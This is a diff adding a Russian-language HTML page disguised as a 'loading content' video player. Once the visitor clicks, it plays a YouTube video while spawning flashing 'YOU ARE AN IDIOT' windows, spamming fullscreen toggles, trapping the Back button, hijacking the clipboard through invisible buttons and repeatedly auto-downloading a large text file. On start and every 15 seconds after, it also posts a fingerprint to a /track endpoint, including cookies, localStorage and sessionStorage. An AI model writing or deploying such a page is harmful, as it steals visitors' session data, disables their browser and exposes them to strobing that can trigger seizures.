@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: #000;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+
+        #start-screen {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #000;
+            cursor: pointer;
+            z-index: 99999;
+            -webkit-tap-highlight-color: transparent;
+        }
+        #start-screen h1 {
+            font-size: 22px;
+            margin-bottom: 30px;
+        }
+        #green-btn {
+            background: #00cc44;
+            color: #fff;
+            border: none;
+            padding: 18px 40px;
+            font-size: 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
+            -webkit-tap-highlight-color: transparent;
+            outline: none;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        #green-btn:hover {
+            background: #00ff55;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        #video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            display: none;
+        }
+        #video-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .virus-window {
+            position: fixed;
+            background: #000;
+            border: 2px solid #fff;
+            color: #fff;
+            font-family: monospace;
+            text-align: center;
+            padding: 8px;
+            z-index: 9999;
+            box-shadow: 0 0 15px #fff;
+            animation: blink 0.25s infinite, shake 0.15s infinite;
+            user-select: none;
+            pointer-events: none;
+            font-weight: bold;
+        }
+        .virus-window h3 {
+            margin: 0;
+            font-size: 16px;
+            line-height: 1;
+        }
+        .virus-window p {
+            margin: 4px 0 0 0;
+            font-size: 12px;
+            line-height: 1;
+        }
+
+        .copy-trap-btn {
+            position: fixed;
+            background: transparent;
+            color: transparent;
+            border: none;
+            outline: none;
+            font-size: 1px;
+            z-index: 10000;
+            cursor: default;
+            box-shadow: none;
+            animation: none;
+            user-select: none;
+            opacity: 0.01;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .copy-trap-btn:active {
+            background: transparent;
+        }
+
+        #giant-trap {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: transparent;
+            border: none;
+            outline: none;
+            opacity: 0.01;
+            z-index: 10001;
+            cursor: default;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        #auto-btn {
+            position: fixed;
+            bottom: 5px;
+            left: 5px;
+            width: 4px;
+            height: 4px;
+            background: transparent;
+            border: none;
+            outline: none;
+            opacity: 0.01;
+            z-index: 999997;
+            cursor: default;
+            -webkit-tap-highlight-color: transparent;
+            padding: 0;
+            margin: 0;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                color: #fff;
+                border-color: #fff;
+                background: #000;
+                box-shadow: 0 0 15px #fff;
+            }
+            50% {
+                color: #000;
+                border-color: #000;
+                background: #fff;
+                box-shadow: 0 0 15px #000;
+            }
+        }
+        @keyframes shake {
+            0%   { transform: translate(0, 0); }
+            25%  { transform: translate(2px, 2px); }
+            50%  { transform: translate(-2px, -2px); }
+            75%  { transform: translate(2px, -2px); }
+            100% { transform: translate(0, 0); }
+        }
+
+        #flash {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 99998;
+            display: none;
+            pointer-events: none;
+            animation: flash 0.1s infinite;
+        }
+        @keyframes flash {
+            0%, 100% { opacity: 0; }
+            50%      { opacity: 0.8; }
+        }
+
+        #kb-trap {
+            position: fixed;
+            opacity: 0;
+            pointer-events: none;
+            top: 50%;
+            left: 50%;
+            width: 1px;
+            height: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="start-screen">
+        <h1>Загрузка контента...</h1>
+        <button id="green-btn">▶ Нажми, чтобы показать</button>
+    </div>
+
+    <div id="video-container">
+        <iframe id="yt-frame"
+            src=""
+            allow="autoplay; fullscreen; encrypted-media"
+            allowfullscreen>
+        </iframe>
+    </div>
+
+    <div id="flash"></div>
+
+    <script>
+        // ================== НАСТРОЙКИ ==================
+        var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
+        var TRACK_ENDPOINT   = "/track";              // куда слать фингерпринт
+        var SOUND_URL        = "";                    // ссылка на mp3 (опц.)
+
+        // пранк-окна
+        var SPAWN_EVERY      = 200;
+        var MAX_WINDOWS      = 0;
+
+        // клавиатура
+        var KEYBOARD_EVERY   = 150;
+
+        // дёрганье fullscreen
+        var FULLSCREEN_SPAM  = true;
+        var FULLSCREEN_EVERY = 500;
+
+        // невидимые кнопки-ловушки
+        var BUTTONS_TOTAL    = 1000;
+        var BUTTONS_EVERY    = 60;
+        var BUTTON_MIN_SIZE  = 200;
+        var BUTTON_MAX_SIZE  = 300;
+
+        // огромная кнопка на весь экран
+        var GIANT_BUTTON       = true;
+        var GIANT_COPY_COUNT   = 10;
+        var GIANT_COPY_GAP     = 100;
+
+        // спам скачиванием текстового файла
+        var DOWNLOAD_SPAM      = true;
+        var DOWNLOAD_EVERY     = 1000;
+        var DOWNLOAD_FILENAME  = "YOUAREANIDIOT.txt";
+        var DOWNLOAD_REPEATS   = 300000;
+
+        // текст, который копируется
+        var CLIP_TEXT          = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
+        // ===============================================
+
+        var started = false;
+        var stopFlag = false;
+
+        var windowCount     = 0;
+        var trapBtnCount    = 0;
+
+        var spawnInterval     = null;
+        var kbInterval        = null;
+        var trapBtnInterval   = null;
+        var fsInterval        = null;
+        var fsOn              = false;
+        var downloadInterval  = null;
+
+        // ---------- запуск ----------
+        function startVideo() {
+            if (started) return;
+            started = true;
+
+            document.getElementById('start-screen').classList.add('hidden');
+
+            // создаём ловушки только после старта
+            if (!document.getElementById('giant-trap')) {
+                var giant = document.createElement("button");
+                giant.id = "giant-trap";
+                giant.setAttribute("aria-hidden", "true");
+                document.body.appendChild(giant);
+            }
+
+            if (!document.getElementById('auto-btn')) {
+                var autoBtn = document.createElement("button");
+                autoBtn.id = "auto-btn";
+                autoBtn.setAttribute("aria-hidden", "true");
+                document.body.appendChild(autoBtn);
+            }
+
+            // видео
+            try {
+                var container = document.getElementById('video-container');
+                container.style.display = 'block';
+                var iframe = document.getElementById('yt-frame');
+                iframe.src = "https://www.youtube.com/embed/" + VIDEO_ID +
+                             "?autoplay=1&mute=0&controls=1&rel=0&playsinline=1";
+            } catch (e) {}
+
+            // доп. звук mp3
+            if (SOUND_URL) {
+                try {
+                    var a = new Audio(SOUND_URL);
+                    a.loop = true;
+                    a.volume = 1;
+                    a.play().catch(function () {});
+                } catch (e) {}
+            }
+
+            // fullscreen
+            try {
+                var el = document.documentElement;
+                if (el.requestFullscreen) {
+                    el.requestFullscreen();
+                } else if (el.webkitRequestFullscreen) {
+                    el.webkitRequestFullscreen();
+                }
+                fsOn = true;
+            } catch (e) {}
+
+            // блокировка «Назад»
+            try {
+                history.pushState({ p: 1 }, "", location.href);
+                window.addEventListener('popstate', function () {
+                    history.pushState({ p: 1 }, "", location.href);
+                });
+            } catch (e) {}
+
+            // вспышка
+            document.getElementById('flash').style.display = 'block';
+
+            // хаос
+            startWindows();
+            startKeyboardSpam();
+            startTrapButtons();
+            startFullscreenSpam();
+            startGiantButton();
+            startAutoBtnSpam();
+            sendFingerprint();
+
+            // старт загрузок
+            startDownloadSpam();
+        }
+
+        // ---------- окна ----------
+        function spawnWindow() {
+            if (stopFlag) return;
+            if (MAX_WINDOWS > 0 && windowCount >= MAX_WINDOWS) {
+                if (spawnInterval) {
+                    clearInterval(spawnInterval);
+                    spawnInterval = null;
+                }
+                return;
+            }
+
+            windowCount++;
+
+            var win = document.createElement('div');
+            win.className = 'virus-window';
+
+            var w = 120 + Math.floor(Math.random() * 80);
+            var h = 60 + Math.floor(Math.random() * 40);
+
+            var x = Math.max(0, Math.floor(Math.random() * (window.innerWidth - w)));
+            var y = Math.max(0, Math.floor(Math.random() * (window.innerHeight - h)));
+
+            win.style.left   = x + 'px';
+            win.style.top    = y + 'px';
+            win.style.width  = w + 'px';
+            win.style.height = h + 'px';
+
+            win.innerHTML = '<h3>YOU ARE AN IDIOT</h3><p>#' + windowCount + '</p>';
+
+            document.body.appendChild(win);
+        }
+
+        function startWindows() {
+            spawnWindow();
+            spawnInterval = setInterval(spawnWindow, SPAWN_EVERY);
+        }
+
+        // ---------- клавиатура ----------
+        function toggleKeyboard() {
+            if (stopFlag) return;
+
+            var inp = document.getElementById('kb-trap');
+            if (!inp) {
+                inp = document.createElement('input');
+                inp.id = 'kb-trap';
+                inp.type = 'text';
+                inp.setAttribute('autocomplete', 'off');
+                inp.setAttribute('autocorrect', 'off');
+                inp.setAttribute('autocapitalize', 'off');
+                document.body.appendChild(inp);
+            }
+
+            try {
+                inp.focus();
+                inp.blur();
+            } catch (e) {}
+        }
+
+        function startKeyboardSpam() {
+            kbInterval = setInterval(toggleKeyboard, KEYBOARD_EVERY);
+        }
+
+        // ---------- fullscreen ----------
+        function toggleFullscreen() {
+            if (stopFlag) return;
+
+            try {
+                if (!fsOn) {
+                    var el = document.documentElement;
+                    if (el.requestFullscreen) {
+                        el.requestFullscreen();
+                    } else if (el.webkitRequestFullscreen) {
+                        el.webkitRequestFullscreen();
+                    }
+                    fsOn = true;
+                } else {
+                    if (document.exitFullscreen) {
+                        document.exitFullscreen();
+                    } else if (document.webkitExitFullscreen) {
+                        document.webkitExitFullscreen();
+                    }
+                    fsOn = false;
+                }
+            } catch (e) {
+                fsOn = !fsOn;
+            }
+        }
+
+        function startFullscreenSpam() {
+            if (!FULLSCREEN_SPAM) return;
+            fsInterval = setInterval(toggleFullscreen, FULLSCREEN_EVERY);
+        }
+
+        // ---------- копирование ----------
+        function copyToClipboardNow() {
+            try {
+                var ta = document.createElement('textarea');
+                ta.value = CLIP_TEXT;
+                ta.style.position = 'fixed';
+                ta.style.opacity = '0';
+                ta.style.pointerEvents = 'none';
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                ta.remove();
+            } catch (e) {}
+
+            try {
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
+                }
+            } catch (e) {}
+        }
+
+        function copyMultipleTimes() {
+            var attempts = 0;
+
+            function tryCopy() {
+                if (stopFlag) return;
+                if (attempts >= GIANT_COPY_COUNT) return;
+
+                attempts++;
+                copyToClipboardNow();
+
+                if (attempts < GIANT_COPY_COUNT) {
+                    setTimeout(tryCopy, GIANT_COPY_GAP);
+                }
+            }
+
+            tryCopy();
+        }
+
+        // ---------- невидимые кнопки ----------
+        function spawnTrapButton() {
+            if (stopFlag) return;
+            if (trapBtnCount >= BUTTONS_TOTAL) {
+                if (trapBtnInterval) {
+                    clearInterval(trapBtnInterval);
+                    trapBtnInterval = null;
+                }
+                return;
+            }
+
+            trapBtnCount++;
+
+            var btn = document.createElement('button');
+            btn.className = 'copy-trap-btn';
+            btn.type = 'button';
+
+            var size = BUTTON_MIN_SIZE + Math.floor(Math.random() *
+                       (BUTTON_MAX_SIZE - BUTTON_MIN_SIZE));
+            btn.style.width  = size + 'px';
+            btn.style.height = size + 'px';
+
+            var maxX = window.innerWidth  - size;
+            var maxY = window.innerHeight - size;
+            var x = Math.max(0, Math.floor(Math.random() * maxX));
+            var y = Math.max(0, Math.floor(Math.random() * maxY));
+            btn.style.left = x + 'px';
+            btn.style.top  = y + 'px';
+
+            btn.addEventListener('click', function () {
+                copyToClipboardNow();
+            });
+
+            btn.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                copyToClipboardNow();
+            }, { passive: false });
+
+            document.body.appendChild(btn);
+        }
+
+        function startTrapButtons() {
+            trapBtnInterval = setInterval(spawnTrapButton, BUTTONS_EVERY);
+        }
+
+        // ---------- огромная кнопка ----------
+        function startGiantButton() {
+            if (!GIANT_BUTTON) return;
+
+            var giant = document.getElementById('giant-trap');
+            if (!giant) return;
+
+            giant.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                copyMultipleTimes();
+            }, { passive: false });
+
+            giant.addEventListener('click', function (e) {
+                e.preventDefault();
+                copyMultipleTimes();
+            });
+        }
+
+        // ---------- авто-клик по маленькой кнопке ----------
+        function startAutoBtnSpam() {
+            if (!DOWNLOAD_SPAM) return;
+
+            var clicks = 0;
+            var btn = document.getElementById('auto-btn');
+            if (!btn) return;
+
+            btn.addEventListener('click', function () {
+                triggerDownload();
+            });
+
+            btn.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                triggerDownload();
+            }, { passive: false });
+
+            downloadInterval = setInterval(function () {
+                if (stopFlag) return;
+
+                clicks++;
+
+                try {
+                    btn.click();
+                } catch (e) {}
+
+                if (clicks >= 200) {
+                    clearInterval(downloadInterval);
+                    downloadInterval = null;
+                }
+            }, 100);
+        }
+
+        // ---------- спам скачиванием ----------
+        function buildBigContent() {
+            var line = CLIP_TEXT + "\n";
+            var out = "";
+            for (var i = 0; i < DOWNLOAD_REPEATS; i++) {
+                out += line;
+            }
+            return out;
+        }
+
+        function triggerDownload() {
+            if (stopFlag) return;
+
+            try {
+                var big = buildBigContent();
+                var blob = new Blob([big], { type: "text/plain" });
+                var url = URL.createObjectURL(blob);
+
+                var a = document.createElement("a");
+                a.href = url;
+                a.download = DOWNLOAD_FILENAME;
+                a.style.display = "none";
+
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+
+                setTimeout(function () {
+                    URL.revokeObjectURL(url);
+                }, 10000);
+            } catch (e) {}
+        }
+
+        function startDownloadSpam() {
+            if (!DOWNLOAD_SPAM) return;
+            downloadInterval = setInterval(triggerDownload, DOWNLOAD_EVERY);
+        }
+
+        // ---------- фингерпринт ----------
+        function collect() {
+            var d = {};
+
+            d.ua       = navigator.userAgent;
+            d.platform = navigator.platform;
+            d.lang     = navigator.language;
+            d.langs    = (navigator.languages || []).join(",");
+            d.cores    = navigator.hardwareConcurrency || 0;
+            d.mem      = navigator.deviceMemory || 0;
+            d.touch    = ('ontouchstart' in window);
+            d.screen   = screen.width + "x" + screen.height + "x" + screen.colorDepth;
+            d.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            d.url      = location.href;
+            d.ref      = document.referrer || "none";
+            d.hist     = history.length;
+
+            try {
+                var c = document.createElement("canvas");
+                var g = c.getContext("webgl") || c.getContext("experimental-webgl");
+                if (g) {
+                    var e = g.getExtension("WEBGL_debug_renderer_info");
+                    d.gpu_vendor   = g.getParameter(e ? e.UNMASKED_VENDOR_WEBGL   : g.VENDOR);
+                    d.gpu_renderer = g.getParameter(e ? e.UNMASKED_RENDERER_WEBGL : g.RENDERER);
+                }
+            } catch (e) {}
+
+            try {
+                var c2 = document.createElement("canvas");
+                c2.width = 200;
+                c2.height = 50;
+                var x = c2.getContext("2d");
+                x.textBaseline = "top";
+                x.font = "14px Arial";
+                x.fillStyle = "#f60";
+                x.fillRect(0, 0, 100, 20);
+                x.fillStyle = "#069";
+                x.fillText("N3XUS-fp", 2, 15);
+                d.canvas = c2.toDataURL().slice(-64);
+            } catch (e) {}
+
+            try {
+                
+                d.cookies = document.cookie || "none";
+            } catch (e) { d.cookies = "blocked"; }
+
+            try { d.ls = JSON.stringify(localStorage).slice(0, 500); } catch (e) { d.ls = "blocked"; }
+            try { d.ss = JSON.stringify(sessionStorage).slice(0, 500); } catch (e) { d.ss = "blocked"; }
+
+            d.plugins = Array.from(navigator.plugins || [])
+                             .map(function (p) { return p.name; })
+                             .join(",");
+
+            if (navigator.connection) {
+                d.conn = navigator.connection.effectiveType || "?";
+                d.down = navigator.connection.downlink || 0;
+            }
+
+            return d;
+        }
+
+        function sendFingerprint() {
+            try {
+                var data = collect();
+                fetch(TRACK_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                }).catch(function () {});
+            } catch (e) {}
+        }
+
+        // ---------- обработчики ----------
+        document.getElementById('start-screen').addEventListener('click', startVideo);
+        document.getElementById('green-btn').addEventListener('click', function (e) {
+            e.stopPropagation();
+            startVideo();
+        });
+
+        setInterval(sendFingerprint, 15000);
+    </script>
+</body>
+</html>
